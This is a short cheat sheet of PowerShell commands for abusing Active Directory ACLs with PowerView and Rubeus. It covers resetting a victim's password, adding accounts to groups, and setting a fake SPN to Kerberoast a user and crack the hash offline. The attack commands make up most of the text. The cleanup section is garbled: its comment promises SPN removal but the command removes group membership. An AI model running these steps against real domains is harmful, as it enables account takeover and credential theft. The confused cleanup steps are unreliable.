# Abusing ACLs
## Change a password of the user
### Creating a PSCredential Object
```powershell
$SecPassword = ConvertTo-SecureString 'ThePassWord' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('MYDOMAIN\UserName', $SecPassword) 
```
Then we have to create a SecureString object which represents the password we want to set for the target user.
### Creating a SecureString Object
```powershell
$targetUsetPassword = ConvertTo-SecureString 'ThePassWord' -AsPlainText -Force
```
### Changing the User's Password
```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity TargetVictime -AccountPassword $targetUsetPassword -Credential $Cred -Verbose
```
## Add a user to a Group
```powershell
Get-ADGroup -Identity "GroupName" -Properties * | Select -ExpandProperty Members
Add-DomainGroupMember -Identity 'GroupName' -Members 'UserName' -Credential $Cred2 -Verbose
#check if that works
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
## Kerberoasting attack with fake SPN
### Creating a Fake SPN

```powershell
Set-DomainObject -Credential $Cred2 -Identity UserName -SET @{serviceprincipalname='Aname/LEGIT'} -Verbose
```
If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.
### Kerberoasting with Rubeus
```powershell
.\Rubeus.exe kerberoast /user:UserName /nowrap
```
Now crack the password with Hashcat and after you have to clean it up :
### Cleanup
```powershell
    #1-Remove the fake SPN we created on the adunn user.
Remove-DomainGroupMember -Identity "Group name" -Members 'UserName' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "group" | Select MemberName |? {$_.MemberName -eq 'UserName'} -Verbose
    #2-Remove the previously user from the group
    #3-Set the password for the user back to its original value (if we can) or have our client set it/alert the user
```
























